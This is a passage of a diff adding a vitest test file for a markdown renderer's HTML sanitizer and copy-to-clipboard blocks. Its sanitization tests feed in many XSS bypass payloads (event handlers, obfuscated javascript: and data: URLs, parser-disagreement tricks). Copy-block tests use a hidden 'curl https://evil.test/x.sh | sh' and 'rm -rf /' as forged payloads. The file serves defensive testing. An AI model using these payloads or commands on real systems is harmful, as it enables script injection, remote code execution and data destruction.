@@ -1,0 +1,1687 @@
+// @vitest-environment jsdom
+// The sanitizer runs on a real DOM. The default `node` environment has none,
+// and DOMPurify would pass its input straight back.
+
+import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
+import { marked } from 'marked';
+
+// Mutable stand-in for basePath's load-time `WORKSPACE_ID` const (the gateway
+// slug this bundle is served under, or null when served directly / in tests with
+// no stamped <base>). Read via a getter so renderMarkdown sees the current value.
+const base = vi.hoisted(() => ({ workspaceId: null as string | null }));
+vi.mock('./basePath', () => ({
+  get WORKSPACE_ID() {
+    return base.workspaceId;
+  },
+  API: '/myws/api/v1',
+}));
+
+import { lucidos } from '@lucidos/sdk';
+import { renderMarkdown, renderMarkdownInline } from './renderMarkdown';
+// The downstream consumer of this output, so one test can assert the pair.
+import { linkifyPaths } from './linkifyPaths';
+
+describe('renderMarkdown', () => {
+  it('converts basic markdown to HTML', () => {
+    const html = renderMarkdown('**bold** and *italic*');
+    expect(html).toContain('<strong>bold</strong>');
+    expect(html).toContain('<em>italic</em>');
+  });
+
+  it('converts headings', () => {
+    const html = renderMarkdown('# Heading 1\n## Heading 2');
+    expect(html).toContain('<h1');
+    expect(html).toContain('Heading 1');
+    expect(html).toContain('<h2');
+    expect(html).toContain('Heading 2');
+  });
+
+  it('gives no heading an id in chat, where messages would repeat them', () => {
+    expect(renderMarkdown('## Usage', { cache: false })).not.toContain('id=');
+  });
+
+  it('gives a document heading the anchor id GitHub gives it', () => {
+    const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/guide.md' } as const;
+    const html = renderMarkdown(
+      '## Auth tier compatibility (API key vs subscription / OAuth)',
+      { cache: false, document: doc },
+    );
+    expect(html).toContain('id="user-content-auth-tier-compatibility-api-key-vs-subscription--oauth"');
+  });
+
+  it('numbers a repeated document heading, and keeps an authored id', () => {
+    const doc = { kind: 'workspace', path: 'artifacts/notes.md' } as const;
+    const html = renderMarkdown(
+      '## Usage\n\n## Usage\n\n<h3 id="mine">Usage</h3>\n\n## 🚀',
+      { cache: false, document: doc },
+    );
+    expect(html).toContain('id="user-content-usage"');
+    expect(html).toContain('id="user-content-usage-1"');
+    expect(html).toContain('<h3 id="mine">');
+    expect(html).toContain('<h2>🚀</h2>');
+  });
+
+  it('caches a document separately from the same text in chat', () => {
+    const md = '## Cached heading';
+    renderMarkdown(md);
+    const doc = { kind: 'workspace', path: 'artifacts/notes.md' } as const;
+    expect(renderMarkdown(md, { document: doc })).toContain('id="user-content-cached-heading"');
+    expect(renderMarkdown(md)).not.toContain('id=');
+  });
+
+  describe('link tooltips', () => {
+    it('stamps no tooltip in chat, which has no document to resolve against', () => {
+      const html = renderMarkdown('[guide](../guide.md)', { cache: false });
+      expect(html).not.toContain('data-tooltip');
+    });
+
+    it('stamps the resolved path on a relative link in a document, matching a click', () => {
+      const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/databricks.md' } as const;
+      const html = renderMarkdown(
+        '[databricks guide](../deploy/databricks/README.md)',
+        { cache: false, document: doc },
+      );
+      expect(html).toContain('data-tooltip="deploy/databricks/README.md"');
+      expect(html).toContain('data-tooltip-longpress');
+    });
+
+    it("stamps a found heading's own text for an in-page anchor", () => {
+      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
+      const md = '## Auth tier compatibility (API key vs subscription / OAuth)\n\n'
+        + 'See [the section](#auth-tier-compatibility-api-key-vs-subscription--oauth).';
+      const html = renderMarkdown(md, { cache: false, document: doc });
+      expect(html).toContain(
+        'data-tooltip="Auth tier compatibility (API key vs subscription / OAuth)"',
+      );
+    });
+
+    it('matches the "No ... section" toast wording when no heading matches', () => {
+      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
+      const html = renderMarkdown('[missing](#nope)', { cache: false, document: doc });
+      expect(html).toContain('data-tooltip="No &quot;nope&quot; section in notes/plan.md"');
+    });
+
+    it('stamps the full URL on an external link', () => {
+      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
+      const html = renderMarkdown(
+        '[example](https://example.com/docs)',
+        { cache: false, document: doc },
+      );
+      expect(html).toContain('data-tooltip="https://example.com/docs"');
+    });
+
+    it('marks a link climbing above the root as not reachable, without resolving it', () => {
+      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
+      const html = renderMarkdown('[outside](../../outside.md)', { cache: false, document: doc });
+      expect(html).toContain('data-tooltip="../../outside.md (not reachable)"');
+    });
+
+    it('moves an authored markdown title to data-tooltip-title, next to the resolved target', () => {
+      const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/databricks.md' } as const;
+      const html = renderMarkdown(
+        '[guide](../deploy/databricks/README.md "The deploy guide")',
+        { cache: false, document: doc },
+      );
+      expect(html).toContain('data-tooltip-title="The deploy guide"');
+      expect(html).toContain('data-tooltip="deploy/databricks/README.md"');
+      // The bare `title` attribute is gone, not just overshadowed: strip the
+      // `data-tooltip-title` occurrence before checking for a leftover one.
+      expect(html.replace('data-tooltip-title="The deploy guide"', '')).not.toContain('title="');
+    });
+  });
+
+  it('converts soft breaks to hard breaks', () => {
+    const html = renderMarkdown('line one\nline two');
+    expect(html).toContain('<br');
+  });
+
+  it('converts lists', () => {
+    const html = renderMarkdown('- item one\n- item two\n- item three');
+    expect(html).toContain('<ul>');
+    expect(html).toContain('<li>');
+    expect(html).toContain('item one');
+    expect(html).toContain('item two');
+  });
+
+  it('handles code blocks with copy button', () => {
+    const html = renderMarkdown('```js\nconsole.log("hi")\n```');
+    expect(html).toContain('<div class="code-block-wrapper" data-copy-code="">');
+    expect(html).toContain('code-block-copy-btn');
+    expect(html).toContain('<code>');
+    expect(html).toContain('console.log');
+  });
+
+  it('shows language label on code blocks', () => {
+    const html = renderMarkdown('```python\nprint("hi")\n```');
+    expect(html).toContain('<span class="code-block-lang">python</span>');
+  });
+
+  it('escapes HTML in language label to prevent XSS', () => {
+    const html = renderMarkdown('```js<script>alert(1)</script>\ncode\n```');
+    expect(html).not.toContain('<script>');
+    expect(html).toContain('&lt;script&gt;');
+  });
+
+  it('labels a code block with the first word of its info string', () => {
+    const html = renderMarkdown('```js title="my file.js" lines=2\nx\n```');
+    expect(html).toContain('<span class="code-block-lang">js</span>');
+    expect(html).toContain('<pre><code>x</code></pre>');
+  });
+
+  it('labels a code block whose attributes sit in braces', () => {
+    const html = renderMarkdown('```python {linenos=true hl_lines=[2]}\nx\n```');
+    expect(html).toContain('<span class="code-block-lang">python</span>');
+    expect(html).toContain('<pre><code>x</code></pre>');
+  });
+
+  it.each(['c++', 'c#', 'objective-c', 'shell-session', 'node.js'])('labels a code block in %s', (lang) => {
+    expect(renderMarkdown('```' + lang + '\nx\n```')).toContain(`<span class="code-block-lang">${lang}</span>`);
+  });
+
+  // A paste written Slack-style, with the code on the opening fence line,
+  // which CommonMark reads as the info string.
+  it('renders text on the opening fence line as code, not as a label', () => {
+    const html = renderMarkdown('Schema:\n```{"agent":"Mozilla/5.0 (Mac)","id":"<brand>"}\n```');
+    expect(html).not.toContain('code-block-lang');
+    expect(html).toContain('<pre><code>{"agent":"Mozilla/5.0 (Mac)","id":"&lt;brand&gt;"}</code></pre>');
+  });
+
+  it.each(['const x = 1', 'SELECT * FROM users', 'ls -la'])('renders %s on the opening fence line as code', (line) => {
+    const html = renderMarkdown('```' + line + '\n```');
+    expect(html).not.toContain('code-block-lang');
+    expect(html).toContain(`<pre><code>${line}</code></pre>`);
+  });
+
+  // An ambiguous attribute pattern backtracks exponentially and hangs here.
+  it('reads a long attribute-like fence line in linear time', () => {
+    const line = 'js' + ' a="b c=d"'.repeat(40) + ' !';
+    expect(renderMarkdown('```' + line + '\n```')).not.toContain('code-block-lang');
+  });
+
+  it('keeps the backslashes in code on the opening fence line', () => {
+    const html = renderMarkdown('```{"msg":"say \\"hi\\""}\n```');
+    expect(html).toContain('<pre><code>{"msg":"say \\"hi\\""}</code></pre>');
+  });
+
+  it('keeps the lines under a fence line that carries code', () => {
+    const html = renderMarkdown('```{\n  "a": 1\n}\n```');
+    expect(html).not.toContain('code-block-lang');
+    expect(html).toContain('<pre><code>{\n  "a": 1\n}</code></pre>');
+  });
+
+  it('renders code blocks without language', () => {
+    const html = renderMarkdown('```\nsome code\n```');
+    expect(html).toContain('code-block-wrapper');
+    expect(html).toContain('code-block-copy-btn');
+    expect(html).not.toContain('code-block-lang');
+  });
+
+  it('handles inline code', () => {
+    const html = renderMarkdown('use `foo()` here');
+    expect(html).toContain('<code>foo()</code>');
+  });
+
+  it('handles tables', () => {
+    const md = '| Name | Value |\n| --- | --- |\n| A | 1 |';
+    const html = renderMarkdown(md);
+    expect(html).toContain('<div class="table-scroll-wrapper"><table>');
+    expect(html).toContain('</table></div>');
+    expect(html).toContain('<th>');
+    expect(html).toContain('Name');
+  });
+
+  it('handles empty input', () => {
+    expect(renderMarkdown('')).toBe('');
+  });
+
+  it('handles plain text without markdown', () => {
+    const html = renderMarkdown('just plain text');
+    expect(html).toContain('just plain text');
+  });
+
+  it('handles links', () => {
+    const html = renderMarkdown('[link](https://example.com)');
+    expect(html).toContain('<a href="https://example.com"');
+    expect(html).toContain('link</a>');
+  });
+
+  describe('HTML sanitization', () => {
+    it('escapes raw <iframe> in text instead of rendering it', () => {
+      const html = renderMarkdown('Sandboxed <iframe> rendering');
+      expect(html).not.toContain('<iframe>');
+      expect(html).toContain('&lt;iframe&gt;');
+    });
+
+    it('escapes <script> tags', () => {
+      const html = renderMarkdown('Try <script>alert(1)</script> here');
+      expect(html).not.toContain('<script>');
+      expect(html).toContain('&lt;script&gt;');
+    });
+
+    it('escapes <object> and <embed> tags', () => {
+      const html = renderMarkdown('Use <object data="x"> and <embed src="y">');
+      expect(html).not.toContain('<object');
+      expect(html).not.toContain('<embed');
+      expect(html).toContain('&lt;object');
+      expect(html).toContain('&lt;embed');
+    });
+
+    it('does not affect HTML inside code blocks', () => {
+      const html = renderMarkdown('```\n<iframe src="x"></iframe>\n```');
+      expect(html).toContain('code-block-wrapper');
+      expect(html).not.toContain('<iframe');
+      expect(html).toContain('&lt;iframe');
+    });
+
+    it('escapes structural HTML tags inside code blocks so they render as text', () => {
+      // Regression: <html>, <head>, <body>, <title>, <!DOCTYPE> are not in the
+      // ESCAPE_TO_TEXT_TAG filter. If the code renderer doesn't escape its text,
+      // the browser parses these as actual elements and the code block renders
+      // empty (the user-reported bug for the JS SDK boilerplate snippet).
+      const md = '```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>X</title>\n  </head>\n  <body>hi</body>\n</html>\n```';
+      const html = renderMarkdown(md);
+      expect(html).not.toContain('<!DOCTYPE html>');
+      expect(html).not.toContain('<html>');
+      expect(html).not.toContain('<title>');
+      expect(html).not.toContain('<body>');
+      expect(html).toContain('&lt;!DOCTYPE html&gt;');
+      expect(html).toContain('&lt;title&gt;X&lt;/title&gt;');
+      expect(html).toContain('&lt;body&gt;hi&lt;/body&gt;');
+    });
+
+    it('preserves HTML inside inline code', () => {
+      const html = renderMarkdown('use `<iframe>` element');
+      expect(html).toContain('<code>&lt;iframe&gt;</code>');
+    });
+
+    it('strips event-handler attributes from raw HTML that marked preserves', () => {
+      const html = renderMarkdown('<img src="x" onerror="alert(1)"> <span onClick=alert(2)>ok</span>');
+      expect(html).toContain('<img src="x">');
+      expect(html).toContain('<span>ok</span>');
+      expect(html).not.toContain('onerror');
+      expect(html).not.toContain('onClick');
+      expect(html).not.toContain('alert(1)');
+    });
+
+    it('strips javascript and data URL attributes from raw HTML', () => {
+      const html = renderMarkdown('<a href="javascript:alert(1)">x</a><img src=data:text/html,evil>');
+      expect(html).toContain('<a>x</a>');
+      expect(html).toContain('<img>');
+      expect(html).not.toContain('javascript:');
+      expect(html).not.toContain('data:text/html');
+    });
+
+    it('strips entity-obfuscated javascript and data URL attributes from raw HTML', () => {
+      const html = renderMarkdown(
+        '<a href="jav&#x61;script&colon;alert(1)">x</a><img src="da&#116;a:text/html,evil">',
+      );
+      expect(html).toContain('<a>x</a>');
+      expect(html).toContain('<img>');
+      expect(html).not.toContain('jav&#x61;script');
+      expect(html).not.toContain('data:text/html');
+      expect(html).not.toContain('alert(1)');
+    });
+
+    it('strips URL attributes with embedded control whitespace in dangerous schemes', () => {
+      const html = renderMarkdown('<a href="java&#10;script:alert(1)">x</a><img src="da\tta:text/html,evil">');
+      expect(html).toContain('<a>x</a>');
+      expect(html).toContain('<img>');
+      expect(html).not.toContain('java&#10;script');
+      expect(html).not.toContain('data:text/html');
+    });
+
+    it('does not throw on out-of-range numeric character references in URL attributes', () => {
+      expect(() => renderMarkdown('<a href="&#99999999;">x</a>')).not.toThrow();
+    });
+
+    // The old hand-rolled scrubbers matched `\s+name=value` anywhere, and prose
+    // has that shape too. So they deleted the user's own words with no sign
+    // anything had gone: "Set online=yes in the config" came out as "Set in the
+    // config". A parser cannot make that mistake, because it knows text from
+    // markup. These cases stay as the regression they were filed as.
+    it.each([
+      ['Set online=yes in the config file.', 'Set online=yes in the config file.'],
+      ['Use once=true to run it a single time.', 'Use once=true to run it a single time.'],
+      ['Deploy with only=web and once=1.', 'Deploy with only=web and once=1.'],
+      ['Values: on_error=retry, on_success=stop.', 'Values: on_error=retry, on_success=stop.'],
+      ['The flag onboarding=disabled turns it off.', 'The flag onboarding=disabled turns it off.'],
+    ])('keeps prose that merely looks like a handler attribute: %s', (src, kept) => {
+      expect(renderMarkdown(src, { cache: false })).toContain(kept);
+    });
+
+    it('keeps an `on…=` run inside a copy block, so the copied text is intact', () => {
+      const html = renderMarkdown('<copy>lucidos trigger set on_event=ThreadCompleted</copy>', { cache: false });
+      expect(html).toContain('data-copy-text="lucidos trigger set on_event=ThreadCompleted"');
+    });
+
+    // An attribute value may contain `>`, which is where a regex that stops at
+    // the first one loses the rest of the tag.
+    it('still strips a handler/href hidden behind a `>` inside an earlier attribute value', () => {
+      const html = renderMarkdown(
+        '<a title="a>b" href="javascript:alert(1)" onmouseover="alert(2)">x</a>',
+        { cache: false },
+      );
+      expect(html).not.toContain('javascript:');
+      expect(html).not.toContain('onmouseover');
+      expect(html).not.toContain('alert(');
+    });
+
+    // A text node escapes `<`, `>` and `&`, and leaves `"` alone.
+    it('leaves an unterminated tag inert: marked escapes it to text', () => {
+      const html = renderMarkdown('<a href="javascript:alert(1)" onclick="alert(2)"', { cache: false });
+      expect(html).not.toContain('<a ');
+      expect(html).toContain('&lt;a href="javascript:alert(1)"');
+    });
+
+    it('drops a handler attribute without leaving a double space behind', () => {
+      expect(renderMarkdown('<span class="a" onclick="x" id="b">y</span>', { cache: false }))
+        .toContain('<span class="a" id="b">y</span>');
+    });
+
+    // A bare boolean attribute serializes with an empty value, which is the
+    // same attribute: HTML gives it its meaning by presence, not by value.
+    it('keeps a bare boolean attribute and the attribute after it', () => {
+      expect(renderMarkdown('<input disabled onfocus="x" value="v">', { cache: false }))
+        .toContain('<input disabled="" value="v">');
+    });
+
+    // An apostrophe in a comment, or in an unquoted attribute value, used to
+    // open a quote that never closed. Every word after it was then scrubbed as
+    // if it sat inside a tag.
+    it('keeps prose after an HTML comment containing an apostrophe', () => {
+      const html = renderMarkdown("<!-- don't forget -->\n\nSet online=yes in the config.", { cache: false });
+      expect(html).toContain('online=yes');
+    });
+
+    it('keeps prose after an unquoted attribute value containing an apostrophe', () => {
+      const html = renderMarkdown("<h2 id=it's>T</h2>\n\nSet online=yes in the config.", { cache: false });
+      expect(html).toContain('online=yes');
+    });
+
+    it('keeps inline prose after an inline HTML comment with an apostrophe', () => {
+      const html = renderMarkdownInline("Inline <!-- don't --> then online=yes stays");
+      expect(html).toContain('online=yes');
+    });
+
+    // RCDATA is where a hand-rolled scanner and the browser disagree about what
+    // a comment IS. Inside `<textarea>` a `<!--` is plain text to the browser,
+    // and `</textarea>` still closes the element. Only the browser's own parser
+    // settles that, which is the whole argument for using one.
+    it.each([
+      '<textarea><!--</textarea><img src=x onerror=alert(1)>',
+      '<title><!--</title><img src=x onerror=alert(1)>',
+      '<textarea rows=1><!--</textarea><a href="javascript:alert(1)">click</a>',
+    ])('does not let an unterminated comment in RCDATA smuggle a handler: %s', (src) => {
+      const html = renderMarkdown(src, { cache: false });
+      expect(html).not.toMatch(/onerror/i);
+      expect(html).not.toMatch(/javascript:/i);
+    });
+
+    it('still strips an unquoted handler attribute', () => {
+      const html = renderMarkdown('<img src=x onerror=alert(1)>', { cache: false });
+      expect(html).not.toContain('onerror');
+      expect(html).not.toContain('alert(');
+    });
+
+    // A raw-text element stops the browser tokenizing tags until its end tag.
+    // A scanner that keeps tokenizing lands a live element inside what it
+    // believes is a quoted attribute value, and never sees its handler.
+    it.each([
+      '<textarea><a title="</textarea><img src=x onerror="alert(1)">',
+      "<title><a title='</title><img src=x onerror='alert(1)'>",
+      '<textarea><a title="</textarea><a href="javascript:alert(1)">go</a>',
+      'Here is a form:\n\n<textarea><!--<b c="</textarea><img src=x onerror=alert(1)>\n\nDone.',
+    ])('keeps a raw-text element from smuggling a live element past the walk: %s', (src) => {
+      const html = renderMarkdown(src, { cache: false });
+      // Everything between the start and end tag is inert text, so the only
+      // thing that matters is that nothing live survives AFTER the end tag.
+      const after = html.slice(html.toLowerCase().lastIndexOf('</textarea>') + 1)
+        + html.slice(html.toLowerCase().lastIndexOf('</title>') + 1);
+      expect(after).not.toMatch(/<img[^>]*onerror/i);
+      expect(after).not.toMatch(/<a[^>]*javascript:/i);
+    });
+
+    it('resumes scrubbing after a raw-text element closes', () => {
+      const html = renderMarkdown('<textarea>x</textarea><img src=y onerror=alert(1)>', { cache: false });
+      expect(html).not.toMatch(/onerror/i);
+    });
+
+    // A textarea's content is TEXT, so markup typed into one is shown, not run.
+    it('shows markup inside a raw-text element as the text it is', () => {
+      const html = renderMarkdown('<textarea><b onclick="x">hi</b></textarea>', { cache: false });
+      expect(html).toContain('<textarea>&lt;b onclick="x"&gt;hi&lt;/b&gt;</textarea>');
+      expect(html).not.toMatch(/<b[^>]*onclick/i);
+    });
+
+    // DOMPurify's `FORBID_CONTENTS` deletes these WITH their content. Escaping
+    // the tags keeps what the model wrote on screen.
+    it.each(['xmp', 'plaintext', 'noscript', 'noembed', 'noframes'])(
+      'shows a %s element as text instead of deleting its content',
+      (tag) => {
+        const html = renderMarkdown(`<${tag}><b onclick="x">hi</b></${tag}>`, { cache: false });
+        expect(html).toContain(`&lt;${tag}&gt;`);
+        expect(html).toContain('hi');
+        expect(html).not.toMatch(/<b[^>]*onclick/i);
+      },
+    );
+
+    // A `/`-terminated tag has no whitespace after its name, so an escape
+    // pattern that demands whitespace hands it to DOMPurify's deletion instead.
+    it.each(['style', 'script', 'iframe'])(
+      'keeps the prose after a self-closing <%s/>',
+      (tag) => {
+        const html = renderMarkdown(`Before. <${tag}/> After the tag.`, { cache: false });
+        expect(html).toContain('After the tag.');
+      },
+    );
+
+    it('scrubs a handler inside an SVG title, which is markup and not RCDATA', () => {
+      const html = renderMarkdown('<svg><title><b onclick="alert(1)">t</b></title></svg>', { cache: false });
+      expect(html).not.toContain('onclick');
+    });
+
+    // SMIL reaches a URL by indirection, which a name-based attribute filter
+    // cannot see, so the element itself is escaped.
+    it('neutralizes an SVG animate that targets href', () => {
+      const html = renderMarkdown(
+        '<svg><a id=x><animate attributeName="href" values="javascript:alert(1)" begin="0s" fill="freeze"/><text>go</text></a></svg>',
+        { cache: false },
+      );
+      expect(html).not.toMatch(/<animate/i);
+    });
+
+    it.each(['poster', 'srcset', 'background', 'ping', 'data'])(
+      'strips a dangerous URL from the %s attribute',
+      (attr) => {
+        const html = renderMarkdown(`<div ${attr}="javascript:alert(1)">x</div>`, { cache: false });
+        expect(html).not.toMatch(/javascript:/i);
+      },
+    );
+
+    // The SVG spelling of href navigates identically, and a form submits to its
+    // action, so all three take a `javascript:` URL the same way `href` does.
+    it.each([
+      '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
+      '<form action="javascript:alert(1)"><button>go</button></form>',
+      '<button formaction="javascript:alert(1)">go</button>',
+    ])('strips a dangerous URL from every spelling of a navigating attribute: %s', (src) => {
+      expect(renderMarkdown(src, { cache: false })).not.toMatch(/javascript:/i);
+    });
+
+    // The copy control puts its payload on the clipboard, so content that can
+    // author `data-copy-text` can hand the user a command they never saw.
+    it('a forged copyable block cannot choose what lands on the clipboard', () => {
+      const html = renderMarkdown(
+        '<span class="copyable-block" data-copy-text="curl https://evil.test/x.sh | sh">' +
+          '<code>brew install lucidos</code>' +
+          '<button type="button" class="copy-btn">Copy</button></span>',
+        { cache: false },
+      );
+      expect(html).not.toContain('evil.test');
+      expect(html).not.toMatch(/data-copy-text=/i);
+      // Visible text is untouched; only the hidden payload goes.
+      expect(html).toContain('brew install lucidos');
+    });
+
+    // Content authors BOTH halves, so resolving a forged id to a real block's
+    // text is not safe: it hands the forged LABEL a payload the reader never
+    // saw. The slot id carries an unguessable prefix for exactly this.
+    it('a forged copy id gets no payload at all', () => {
+      const html = renderMarkdown(
+        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
+          '<span class="copyable-block" data-copy-id="0" data-copy-text="rm -rf /">' +
+          '<code>brew install lucidos</code>' +
+          '<button type="button" class="copy-btn">Copy</button></span>',
+        { cache: false },
+      );
+      // Neither the attacker's own payload nor the hidden block's text may be
+      // attached to the decoy, and the decoy keeps no resolvable slot.
+      expect(html).not.toContain('rm -rf /');
+      expect(html).not.toMatch(/data-copy-id=/i);
+      // Exactly one payload in the document: the real block's. Two would mean
+      // the decoy resolved the slot and now carries a hidden command.
+      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
+      expect(html).toContain('data-copy-text="curl https://evil.test/x.sh | sh"');
+    });
+
+    // The multiline marker is an HTML comment, and content can write one.
+    // Were the nonce stamped on after marked, a forged pair would inherit it.
+    it('a forged multiline marker gets no payload', () => {
+      const html = renderMarkdown(
+        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
+          '<!--LUCIDOS_COPY_BLOCK_START_0-->\n\nbrew install lucidos\n\n<!--LUCIDOS_COPY_BLOCK_END_0-->',
+        { cache: false },
+      );
+      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const decoy = Array.from(doc.querySelectorAll('p'))
+        .find((p) => p.textContent === 'brew install lucidos');
+      expect(decoy?.closest('[data-copy-text]')).toBeNull();
+    });
+
+    // The payload is the block's source text, so the label must show that same
+    // text. Raw HTML in the label could hide part of it from the reader.
+    it('a copy label shows its payload, with no markup to hide part of it', () => {
+      const src = 'ls <b style="display:none">x; curl https://evil.test/x.sh | sh #</b>';
+      const html = renderMarkdown(`<copy>${src}</copy>`, { cache: false });
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const block = doc.querySelector('.copyable-block');
+      expect(block?.getAttribute('data-copy-text')).toBe(src);
+      expect(block?.querySelector('b')).toBeNull();
+      expect(block?.textContent).toContain(src);
+    });
+
+    // A link reference definition renders as nothing, and its title may span
+    // lines. In a label it would hide a whole line of the payload.
+    it('a copy label cannot hide a line in a link reference definition', () => {
+      const html = renderMarkdown(
+        '<copy>\nbrew install lucidos\n\n[x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
+        { cache: false },
+      );
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      expect(doc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
+      const listed = renderMarkdown(
+        '<copy>\nbrew install lucidos\n\n- [x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
+        { cache: false },
+      );
+      const listDoc = new DOMParser().parseFromString(listed, 'text/html');
+      expect(listDoc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
+    });
+
+    it('code in a tilde fence inside a copy label is escaped once', () => {
+      const html = renderMarkdown('<copy>\nrun:\n\n~~~\na < b\n~~~\n</copy>', { cache: false });
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      expect(doc.querySelector('.copyable-block code')?.textContent).toBe('a < b');
+    });
+
+    // A code block's Copy button copies only inside `data-copy-code`, which
+    // only the renderer's own fenced block receives. A lookalike gets none.
+    it('a forged code-block wrapper copies nothing, and a real fence does', () => {
+      const html = renderMarkdown(
+        '<div class="code-block-wrapper" data-copy-code=""><pre><code>npm i foo' +
+          '<span style="display:none">; curl https://evil.test/x.sh | sh</span></code></pre>' +
+          '<button type="button" class="copy-btn">Copy</button></div>\n\n' +
+          '```sh\nnpm i bar\n```',
+        { cache: false },
+      );
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const copied = Array.from(doc.querySelectorAll('[data-copy-code]'))
+        .map((el) => el.querySelector('pre code')?.textContent);
+      expect(copied).toEqual(['npm i bar']);
+    });
+
+    it('keeps an ordinary action and xlink:href untouched', () => {
+      const html = renderMarkdown('<svg><a xlink:href="/docs">d</a></svg>', { cache: false });
+      expect(html).toContain('xlink:href="/docs"');
+    });
+
+    // marked escapes this one to text outright (the apostrophe stops it being
+    // parsed as raw HTML), so the guarantee is "no live tag carries a handler",
+    // not "the substring is absent".
+    it('still strips a handler after an unquoted value containing an apostrophe', () => {
+      const html = renderMarkdown("<img alt=it's onerror=\"alert(1)\">", { cache: false });
+      expect(html).not.toMatch(/<img[^>]*onerror/i);
+    });
+
+    // Each of these was a bypass in the hand-rolled tokenizer, and each one is
+    // the same root cause: a second model of HTML disagreeing with the
+    // browser's. They are kept as a set so the class stays covered, not just
+    // the three spellings that happened to be reported.
+    it.each([
+      // An abrupt-closing comment. `<!-->` is a complete comment, so a scanner
+      // hunting for `-->` swallows the image and hands it back live.
+      ['abrupt-closing comment', '<!--><img src=x onerror=alert(1)>'],
+      // A nested `<!--` inside a comment does not open a second one.
+      ['nested comment open', '<!-- <!-- --><img src=x onerror=alert(1)>'],
+      // Foreign content: inside `<svg>`, `<style>` is raw text and `<p>` is not
+      // the same element it is in HTML.
+      ['svg style breakout', '<svg><style><a title="</style><img src=x onerror=alert(1)>'],
+      // MathML annotation puts the parser back into HTML mid-subtree.
+      ['mathml annotation', '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)>'],
+      // A tag name with an embedded newline is still that tag to a parser.
+      ['newline in tag name', '<img\nsrc=x\nonerror=alert(1)>'],
+      // A NUL inside the scheme is skipped by a URL parser, not honoured.
+      ['nul byte in scheme', '<a href="java\u0000script:alert(1)">x</a>'],
+    ])('closes the parser-disagreement bypass class: %s', (_name, src) => {
+      const html = renderMarkdown(src, { cache: false });
+      expect(html).not.toMatch(/<[a-z][^>]*\son[a-z]+\s*=/i);
+      expect(html).not.toMatch(/<[a-z][^>]*javascript:/i);
+    });
+
+    // `data:` on an `<img>` is the one DOMPurify allows by default, through
+    // `DATA_URI_TAGS`, and it has no negative form. The URL hook is what closes
+    // it, so this fails the moment the hook stops running.
+    it.each([
+      '<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3C/svg%3E">',
+      '<video poster="data:text/html,evil"></video>',
+      '<audio src="data:text/html,evil"></audio>',
+    ])('strips a data: URL that the sanitizer would otherwise allow: %s', (src) => {
+      expect(renderMarkdown(src, { cache: false })).not.toMatch(/data:/i);
+    });
+
+    // Each of these is claimed by an extractor that runs after the sanitizer.
+    // A stripped href leaves that extractor nothing to read, and the link then
+    // renders as underlined text that does nothing when clicked.
+    it.each([
+      'file:///Users/me/dist/Lucidos.dmg',
+      'repo:aa11aaaa-bbbb-cccc-dddd-eeeeffff0001:file:README.md',
+      'app:habit-tracker',
+      'trigger:aa11aaaa-bbbb-cccc-dddd-eeeeffff0002',
+      'settings:backup',
+    ])('keeps an app-owned scheme the extractors run on: %s', (href) => {
+      expect(renderMarkdown(`[x](${href})`, { cache: false })).toContain(`href="${href}"`);
+    });
+  });
+
+  describe('copy blocks', () => {
+    it('renders inline copy block with wrapper and button', () => {
+      const html = renderMarkdown('Call <copy>+1-555-0123</copy> for info');
+      expect(html).toContain('class="copyable-block"');
+      expect(html).toContain('data-copy-text="+1-555-0123"');
+      expect(html).toContain('class="copy-btn"');
+      expect(html).toContain('+1-555-0123');
+    });
+
+    // An attribute value escapes `&` and `"`, and keeps a newline literal.
+    it('renders multiline copy block with multi class', () => {
+      const html = renderMarkdown('<copy>line one\nline two</copy>');
+      expect(html).toContain('copyable-block-multi');
+      expect(html).toContain('data-copy-text="line one\nline two"');
+    });
+
+    it('uses span for inline and div for multiline', () => {
+      const inlineHtml = renderMarkdown('<copy>short</copy>');
+      expect(inlineHtml).toContain('<span class="copyable-block"');
+
+      const multiHtml = renderMarkdown('<copy>a\nb</copy>');
+      expect(multiHtml).toContain('<div class="copyable-block copyable-block-multi"');
+    });
+
+    it('encodes special characters in data attribute', () => {
+      const html = renderMarkdown('<copy>a & "b"</copy>');
+      expect(html).toContain('data-copy-text="a &amp; &quot;b&quot;"');
+    });
+
+    it('renders markdown inside copy blocks', () => {
+      const html = renderMarkdown('<copy>**bold** text</copy>');
+      expect(html).toContain('<strong>bold</strong>');
+    });
+
+    it('renders large multiline copy block without breaking HTML structure', () => {
+      // Regression: long multiline <copy> blocks had raw newlines in data-copy-text
+      // attribute, which broke marked's HTML parser. The SVG copy icon would render
+      // at full container size instead of being constrained inside .copy-btn.
+      const content = `Refactor panel overlay state from 6 independent signals into a single discriminated union.
+
+Current state: currentSkill, currentComponent, previewFile, panelUrl, activeInlineForm, and viewingNotification are 6 separate signals in store/store.ts that represent mutually exclusive panel overlay state. They're checked in a priority chain in ContentPane.tsx and must be cleared together in switchMenuItem(). This design allows invalid states and has caused bugs (see commit 57eaf3d1 — overlay not clearing when activeMenuItem unchanged).
+
+Target state: Replace with a single signal:
+
+type PanelOverlay =
